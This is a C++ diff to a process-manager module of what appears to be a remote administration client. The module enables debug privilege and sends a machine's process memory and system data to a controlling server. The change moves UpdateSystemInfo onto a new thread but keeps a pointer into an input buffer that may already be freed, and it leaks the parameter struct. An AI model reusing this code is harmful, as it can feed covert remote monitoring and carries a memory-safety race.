@@ -2,11 +2,7 @@
 #include "ProcessManager.h"
 #pragma warning(disable:4996)
 
-struct UpdateSystemInfoParams
-{
-    PBYTE bufferData;
-    ULONG_PTR BufferLength;
-};
+
 
 CProcessManager::CProcessManager(CIocpClient* IocpClient) :CManager(IocpClient)
 {
@@ -22,6 +18,8 @@ CProcessManager::CProcessManager(CIocpClient* IocpClient) :CManager(IocpClient)
 	m_ElementCount = 0;
 	m_TargetHandle = INVALID_HANDLE_VALUE;
 	m_ScanRelpy = 0;
+	m_UpdateSystemInfoParams = NULL;
+	m_UpdateSystemInfoHandle = INVALID_HANDLE_VALUE;
 }
 CProcessManager::~CProcessManager()
 {
@@ -29,6 +27,8 @@ CProcessManager::~CProcessManager()
 	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
 	delete m_Address;
 	m_Address = NULL;
+	delete m_UpdateSystemInfoParams;
+	m_UpdateSystemInfoParams = NULL;
 }
 
 void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
@@ -105,10 +105,12 @@ void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
 		}
 		case CLIENT_VMMAP_SYSTEM_INFO_UPDATE_REQUIRE:
 		{
-			//UpdateSystemInfoParams Parameter;
-			//Parameter.bufferData = BufferData+sizeof(BYTE);
-			//Parameter.BufferLength = sizeof(HANDLE);
-			UpdateSystemInfo((LPBYTE)BufferData + sizeof(BYTE), sizeof(HANDLE));
+			UpdateSystemInfoParams* Parameter=new UpdateSystemInfoParams;
+			Parameter->bufferData = BufferData+sizeof(BYTE);
+			Parameter->BufferLength = sizeof(HANDLE);
+			m_UpdateSystemInfoParams = Parameter;
+			m_UpdateSystemInfoHandle = (HANDLE)CreateThread(NULL, 0,
+				(LPTHREAD_START_ROUTINE)UpdateSystemInfo, (LPVOID)this, 0, NULL);   //接收数据
 			break;
 		}
 
@@ -425,17 +427,18 @@ Exit:
 		BufferData = NULL;
 	}
 }
-
-void CProcessManager::UpdateSystemInfo(PBYTE bufferData, ULONG_PTR BufferLength)
+ DWORD WINAPI CProcessManager::UpdateSystemInfo(LPVOID ParameterData)
 {
+	 CProcessManager* thisClass = (CProcessManager*)ParameterData;
 	HANDLE  processID;
+	PBYTE bufferData = thisClass->m_UpdateSystemInfoParams->bufferData;;
 	memcpy(&processID, bufferData, sizeof(HANDLE));
-	this->m_VMMap.GetSystemInfo();
-	this->m_VMMap.GetMemoryStatus();
-	if (this->m_VMMap.GetMemoryBasicInfo(processID) == FALSE)
+	thisClass->m_VMMap.GetSystemInfo();
+	thisClass->m_VMMap.GetMemoryStatus();
+	if (thisClass->m_VMMap.GetMemoryBasicInfo(processID) == FALSE)
 	{
 		MessageBox(NULL, "获取信息失败!", "错误", NULL);
-		return;
+		return 0;
 	}
 	DWORD LastError = GetLastError();
 	DWORD v1 = 0;
@@ -456,17 +459,18 @@ void CProcessManager::UpdateSystemInfo(PBYTE bufferData, ULONG_PTR BufferLength)
 		BufferData = (PBYTE)LocalReAlloc(BufferData, (Offset + v1),
 			LMEM_ZEROINIT | LMEM_MOVEABLE);
 	}
-	memcpy(BufferData + Offset, &(m_VMMap.SystemInfo), sizeof(SYSTEM_INFO));
+	memcpy(BufferData + Offset, &(thisClass->m_VMMap.SystemInfo), sizeof(SYSTEM_INFO));
 	Offset += sizeof(SYSTEM_INFO);
-	memcpy(BufferData + Offset, &(m_VMMap.MemoryStatus), sizeof(MEMORYSTATUS));
+	memcpy(BufferData + Offset, &(thisClass->m_VMMap.MemoryStatus), sizeof(MEMORYSTATUS));
 	Offset += sizeof(MEMORYSTATUS);
-	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
+	thisClass->m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
 Exit:
 	if (BufferData != NULL)
 	{
 		LocalFree(BufferData);
 		BufferData = NULL;
 	}
+	return 0;
 }
 
 BOOL CProcessManager::SendClientProcessList()
